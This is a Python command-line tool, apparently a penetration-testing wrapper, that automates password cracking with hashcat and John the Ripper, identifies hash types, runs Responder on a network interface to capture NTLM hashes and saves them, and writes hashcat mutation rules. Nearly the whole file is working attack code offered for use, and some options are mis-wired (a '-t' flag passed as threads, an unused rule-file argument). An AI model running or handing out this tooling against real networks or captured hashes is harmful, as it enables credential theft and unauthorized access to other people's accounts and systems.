#!/usr/bin/env python3
import subprocess
import argparse
import sys
import os
import time
import socket
import hashlib
import re
import json
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import logging

class ProfessionalCrackingTools:
    def __init__(self, timeout=300):
        self.timeout = timeout
        self.hash_patterns = {
            'MD5': re.compile(r'^[a-fA-F0-9]{32}$'),
            'SHA1': re.compile(r'^[a-fA-F0-9]{40}$'),
            'SHA256': re.compile(r'^[a-fA-F0-9]{64}$'),
            'SHA512': re.compile(r'^[a-fA-F0-9]{128}$'),
            'NTLM': re.compile(r'^[a-fA-F0-9]{32}$'),
            'NetNTLMv2': re.compile(r'^[^:]+::[^:]*:[a-fA-F0-9]{16}:[a-fA-F0-9]{32}:[a-fA-F0-9]+$'),
            'bcrypt': re.compile(r'^\$2[abyxz]?\$[0-9]{2}\$[A-Za-z0-9./]{53}$'),
            'KeePass': re.compile(r'^\$keepass\$'),
            'WPA/WPA2': re.compile(r'^[a-fA-F0-9]{64}$'),
            'MySQL': re.compile(r'^\*[a-fA-F0-9]{40}$'),
            'PostgreSQL': re.compile(r'^md5[a-fA-F0-9]{32}$')
        }
        
        self.hashcat_modes = {
            'MD5': 0,
            'SHA1': 100,
            'SHA256': 1400,
            'SHA512': 1700,
            'NTLM': 1000,
            'NetNTLMv2': 5600,
            'bcrypt': 3200,
            'KeePass': 13400,
            'WPA/WPA2': 2500,
            'MySQL': 300,
            'PostgreSQL': 12
        }

    def identify_hash_types(self, hashes):
        """Advanced hash type identification"""
        print(f"[*] Analyzing {len(hashes)} hash(es)")
        results = []
        
        for i, hash_value in enumerate(hashes):
            hash_value = hash_value.strip()
            if not hash_value:
                continue
                
            print(f"\n[+] Hash {i+1}: {hash_value[:20]}...")
            identified_types = []
            
            for hash_type, pattern in self.hash_patterns.items():
                if pattern.match(hash_value):
                    identified_types.append(hash_type)
            
            if identified_types:
                print(f"    Possible types: {', '.join(identified_types)}")
                for hash_type in identified_types:
                    if hash_type in self.hashcat_modes:
                        print(f"    Hashcat mode: {self.hashcat_modes[hash_type]} ({hash_type})")
            else:
                print(f"    Unknown hash type")
                self.analyze_unknown_hash(hash_value)
            
            results.append({
                'hash': hash_value,
                'types': identified_types,
                'length': len(hash_value)
            })
        
        return results

    def analyze_unknown_hash(self, hash_value):
        """Analyze unknown hash patterns"""
        length = len(hash_value)
        print(f"    Length: {length} characters")
        
        if '$' in hash_value:
            parts = hash_value.split('$')
            print(f"    Contains {len(parts)-1} '$' separators")
            if len(parts) > 1:
                print(f"    Format identifier: ${parts[1]}$")
        
        if ':' in hash_value:
            parts = hash_value.split(':')
            print(f"    Contains {len(parts)-1} ':' separators")
            print(f"    Possible format: username:hash or hash:salt")

    def validate_hash_formats(self, hashes):
        """Validate hash formats and detect corruption"""
        print(f"[*] Validating {len(hashes)} hash(es)")
        valid_hashes = []
        
        for i, hash_value in enumerate(hashes):
            hash_value = hash_value.strip()
            if not hash_value:
                continue
            
            is_valid = False
            issues = []
            
            # Check for valid hex characters
            if re.match(r'^[a-fA-F0-9:$./]+$', hash_value):
                is_valid = True
            else:
                issues.append("Contains invalid characters")
            
            # Check for common issues
            if len(hash_value) < 8:
                issues.append("Too short to be a valid hash")
            
            if hash_value.count(' ') > 0:
                issues.append("Contains spaces")
            
            print(f"[{'+'if is_valid else '-'}] Hash {i+1}: {'Valid' if is_valid else 'Invalid'}")
            if issues:
                print(f"    Issues: {', '.join(issues)}")
            
            if is_valid:
                valid_hashes.append(hash_value)
        
        print(f"\n[+] {len(valid_hashes)}/{len(hashes)} hashes are valid")
        return valid_hashes

    def advanced_hashcat_attack(self, hash_file, wordlist, hash_mode=None, gpu=False, optimized=False, threads=4):
        """Advanced hashcat attack with auto-detection"""
        print(f"[*] Starting advanced hashcat attack")
        
        # Auto-detect hash mode if not specified
        if hash_mode is None:
            with open(hash_file, 'r') as f:
                sample_hash = f.readline().strip()
            hash_mode = self.auto_detect_hashcat_mode(sample_hash)
        
        cmd = ["hashcat", "-m", str(hash_mode), hash_file, wordlist]
        
        # Performance optimizations
        if gpu:
            cmd.extend(["-O"])  # Optimized kernels
        
        if optimized:
            cmd.extend(["-w", "3"])  # Workload profile
        
        # Multi-threading
        cmd.extend(["-t", str(threads)])
        
        # Output options
        cmd.extend(["--outfile", f"{hash_file}.cracked"])
        cmd.extend(["--outfile-format", "2"])  # hash:password format
        
        # Status updates
        cmd.extend(["--status", "--status-timer", "10"])
        
        cmd.append("--force")
        
        try:
            print(f"[*] Command: {' '.join(cmd)}")
            print(f"[*] Hash mode: {hash_mode}")
            print(f"[*] Wordlist: {wordlist}")
            print(f"[*] GPU acceleration: {'Enabled' if gpu else 'Disabled'}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.timeout)
            
            print(f"[+] Hashcat completed with return code {result.returncode}")
            print(result.stdout)
            
            if result.stderr:
                print(f"[!] Stderr: {result.stderr}")
            
            # Check for cracked passwords
            self.check_cracked_results(f"{hash_file}.cracked")
            
        except subprocess.TimeoutExpired:
            print(f"[!] Hashcat timed out after {self.timeout} seconds")
        except FileNotFoundError:
            print("[!] Error: hashcat not found. Please install hashcat.")
        except Exception as e:
            print(f"[!] Error running hashcat: {e}")

    def auto_detect_hashcat_mode(self, hash_value):
        """Auto-detect appropriate hashcat mode"""
        for hash_type, pattern in self.hash_patterns.items():
            if pattern.match(hash_value):
                if hash_type in self.hashcat_modes:
                    print(f"[+] Auto-detected hash type: {hash_type} (mode {self.hashcat_modes[hash_type]})")
                    return self.hashcat_modes[hash_type]
        
        print(f"[!] Could not auto-detect hash type, defaulting to MD5 (mode 0)")
        return 0

    def check_cracked_results(self, output_file):
        """Check and display cracked results"""
        if os.path.exists(output_file):
            try:
                with open(output_file, 'r') as f:
                    cracked = f.readlines()
                
                if cracked:
                    print(f"\n[+] CRACKED PASSWORDS ({len(cracked)}):")
                    print("=" * 50)
                    for line in cracked:
                        if ':' in line:
                            hash_val, password = line.strip().split(':', 1)
                            print(f"Hash: {hash_val[:20]}...")
                            print(f"Password: {password}")
                            print("-" * 30)
                else:
                    print(f"[-] No passwords cracked")
            except Exception as e:
                print(f"[!] Error reading results: {e}")
        else:
            print(f"[-] No output file found")

    def advanced_john_attack(self, hash_file, wordlist, rule_name=None):
        """Advanced John the Ripper attack"""
        print(f"[*] Starting advanced John the Ripper attack")
        
        cmd = ["john", f"--wordlist={wordlist}", hash_file]
        
        if rule_name:
            cmd.insert(-1, f"--rules={rule_name}")
        
        # Performance options
        cmd.extend(["--fork=4"])  # Multi-processing
        
        try:
            print(f"[*] Command: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.timeout)
            
            print(f"[+] John the Ripper output:")
            print(result.stdout)
            
            # Show cracked passwords
            self.show_john_results(hash_file)
            
        except subprocess.TimeoutExpired:
            print(f"[!] John timed out after {self.timeout} seconds")
        except FileNotFoundError:
            print("[!] Error: john not found. Please install john.")
        except Exception as e:
            print(f"[!] Error running john: {e}")

    def show_john_results(self, hash_file):
        """Show John the Ripper cracked results"""
        try:
            cmd = ["john", "--show", hash_file]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.stdout.strip():
                print(f"\n[+] CRACKED PASSWORDS:")
                print("=" * 50)
                print(result.stdout)
            else:
                print(f"[-] No passwords cracked")
                
        except Exception as e:
            print(f"[!] Error showing results: {e}")

    def multi_tool_attack(self, hash_file, wordlist):
        """Coordinate attack using multiple tools"""
        print(f"[*] Starting multi-tool coordinated attack")
        
        # First, identify hash types
        with open(hash_file, 'r') as f:
            hashes = [line.strip() for line in f.readlines() if line.strip()]
        
        hash_analysis = self.identify_hash_types(hashes)
        
        # Group hashes by type
        hash_groups = {}
        for analysis in hash_analysis:
            for hash_type in analysis['types']:
                if hash_type not in hash_groups:
                    hash_groups[hash_type] = []
                hash_groups[hash_type].append(analysis['hash'])
        
        # Attack each group with appropriate tool
        for hash_type, hash_list in hash_groups.items():
            print(f"\n[*] Attacking {len(hash_list)} {hash_type} hashes")
            
            # Create temporary file for this hash type
            temp_file = f"temp_{hash_type.lower()}.txt"
            with open(temp_file, 'w') as f:
                for hash_val in hash_list:
                    f.write(f"{hash_val}\n")
            
            # Choose best tool for hash type
            if hash_type in ['MD5', 'SHA1', 'SHA256', 'NTLM']:
                self.advanced_hashcat_attack(temp_file, wordlist, 
                                           self.hashcat_modes.get(hash_type, 0))
            else:
                self.advanced_john_attack(temp_file, wordlist)
            
            # Cleanup
            if os.path.exists(temp_file):
                os.remove(temp_file)

    def responder_capture(self, interface, timeout=300):
        """Enhanced Responder for hash capture"""
        print(f"[*] Starting enhanced Responder on interface {interface}")
        print(f"[*] Capture timeout: {timeout} seconds")
        
        cmd = ["responder", "-I", interface, "-v"]
        
        try:
            print(f"[*] Command: {' '.join(cmd)}")
            print(f"[*] Responder will capture hashes. Monitoring for {timeout} seconds...")
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            start_time = time.time()
            captured_hashes = []
            
            while time.time() - start_time < timeout:
                output = process.stdout.readline()
                if output:
                    print(output.strip())
                    
                    # Parse for captured hashes
                    if "NTLMv2-SSP Hash" in output or "NTLMv1-SSP Hash" in output:
                        captured_hashes.append(output.strip())
                
                if process.poll() is not None:
                    break
                
                time.sleep(1)
            
            process.terminate()
            
            if captured_hashes:
                print(f"\n[+] CAPTURED HASHES ({len(captured_hashes)}):")
                print("=" * 50)
                for hash_line in captured_hashes:
                    print(hash_line)
                
                # Save captured hashes
                with open("captured_hashes.txt", "w") as f:
                    for hash_line in captured_hashes:
                        f.write(f"{hash_line}\n")
                print(f"\n[+] Hashes saved to captured_hashes.txt")
            else:
                print(f"[-] No hashes captured")
                
        except FileNotFoundError:
            print("[!] Error: responder not found. Please install responder.")
        except Exception as e:
            print(f"[!] Error running responder: {e}")

    def benchmark_tools(self):
        """Benchmark cracking tools performance"""
        print(f"[*] Benchmarking cracking tools")
        
        # Hashcat benchmark
        try:
            print(f"\n[+] Hashcat Benchmark:")
            cmd = ["hashcat", "-b", "-m", "0"]  # MD5 benchmark
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            print(result.stdout)
        except Exception as e:
            print(f"[!] Hashcat benchmark failed: {e}")
        
        # System info
        print(f"\n[+] System Information:")
        try:
            import platform
            print(f"OS: {platform.system()} {platform.release()}")
            print(f"Architecture: {platform.machine()}")
            print(f"Processor: {platform.processor()}")
        except Exception as _exc:
            pass
            logging.debug("Suppressed exception", exc_info=True)

    def generate_advanced_rules(self):
        """Generate advanced password mutation rules"""
        print(f"[*] Advanced Password Mutation Rules")
        
        rules = {
            "Basic Mutations": [
                ":",      # No change
                "c",      # Capitalize first
                "u",      # Uppercase all
                "l",      # Lowercase all
                "r",      # Reverse
                "d",      # Duplicate
                "f",      # Reflect (duplicate reversed)
                "t",      # Toggle case
            ],
            "Append Numbers": [
                "$1", "$2", "$3", "$4", "$5", "$6", "$7", "$8", "$9", "$0",
                "$1$2", "$1$3", "$2$3", "$1$2$3", "$1$3$7", "$2$0$2$1"
            ],
            "Prepend Numbers": [
                "^1", "^2", "^3", "^4", "^5", "^6", "^7", "^8", "^9", "^0",
                "^2^0", "^1^9", "^2^1"
            ],
            "Special Characters": [
                "$!", "$@", "$#", "$%", "$&", "$*", "$+", "$=",
                "^!", "^@", "^#"
            ],
            "Year Combinations": [
                "$2$0$2$4", "$2$0$2$3", "$2$0$2$2", "$2$0$2$1",
                "$1$9$9$9", "$2$0$0$0"
            ],
            "Complex Rules": [
                "c $1 $3 $7 $!",     # Capitalize + 137!
                "c $2 $0 $2 $4",     # Capitalize + 2024
                "u $! $! $!",        # Uppercase + !!!
                "l $1 $2 $3 $@",     # Lowercase + 123@
                "c r $1 $!",         # Capitalize reverse + 1!
                "d $1 $2 $3",        # Duplicate + 123
            ],
            "Keyboard Patterns": [
                "$q$w$e", "$a$s$d", "$z$x$c",
                "$1$q$a$z", "$q$a$z$1"
            ]
        }
        
        for category, rule_list in rules.items():
            print(f"\n[+] {category}:")
            for rule in rule_list:
                print(f"    {rule}")
        
        # Generate rule file
        rule_file = "advanced_rules.rule"
        with open(rule_file, 'w') as f:
            for category, rule_list in rules.items():
                f.write(f"# {category}\n")
                for rule in rule_list:
                    f.write(f"{rule}\n")
                f.write("\n")
        
        print(f"\n[+] Advanced rules saved to {rule_file}")
        print(f"[*] Usage: hashcat -m <mode> <hashfile> <wordlist> -r {rule_file}")

def main():
    parser = argparse.ArgumentParser(description="Professional Password Cracking Tools")
    parser.add_argument("--hashcat", help="Run advanced hashcat attack (provide hash file)")
    parser.add_argument("--john", help="Run advanced John the Ripper (provide hash file)")
    parser.add_argument("--multi-attack", help="Multi-tool coordinated attack (provide hash file)")
    parser.add_argument("--responder", help="Start enhanced Responder (provide interface)")
    parser.add_argument("--identify-hashes", nargs='+', help="Identify hash types")
    parser.add_argument("--validate-hashes", nargs='+', help="Validate hash formats")
    parser.add_argument("--benchmark", action="store_true", help="Benchmark tools")
    parser.add_argument("--advanced-rules", action="store_true", help="Generate advanced rules")
    
    # Attack options
    parser.add_argument("--hash-mode", type=int, help="Hashcat hash mode (auto-detect if not specified)")
    parser.add_argument("--wordlist", default="/usr/share/wordlists/rockyou.txt", help="Wordlist file")
    parser.add_argument("--rule-file", help="Rule file for hashcat")
    parser.add_argument("--john-rule", help="John rule name")
    parser.add_argument("--gpu", action="store_true", help="Enable GPU acceleration")
    parser.add_argument("--optimized", action="store_true", help="Use optimized kernels")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads")
    parser.add_argument("--timeout", type=int, default=300, help="Attack timeout in seconds")
    
    args = parser.parse_args()
    
    cracker = ProfessionalCrackingTools(args.timeout)
    
    if args.identify_hashes:
        cracker.identify_hash_types(args.identify_hashes)
    
    elif args.validate_hashes:
        cracker.validate_hash_formats(args.validate_hashes)
    
    elif args.hashcat:
        cracker.advanced_hashcat_attack(args.hashcat, args.wordlist, args.hash_mode,
                                      args.gpu, args.optimized, args.threads)
    
    elif args.john:
        cracker.advanced_john_attack(args.john, args.wordlist, args.john_rule)
    
    elif args.multi_attack:
        cracker.multi_tool_attack(args.multi_attack, args.wordlist)
    
    elif args.responder:
        cracker.responder_capture(args.responder, args.timeout)
    
    elif args.benchmark:
        cracker.benchmark_tools()
    
    elif args.advanced_rules:
        cracker.generate_advanced_rules()
    
    else:
        print("Please specify an action. Use --help for options.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)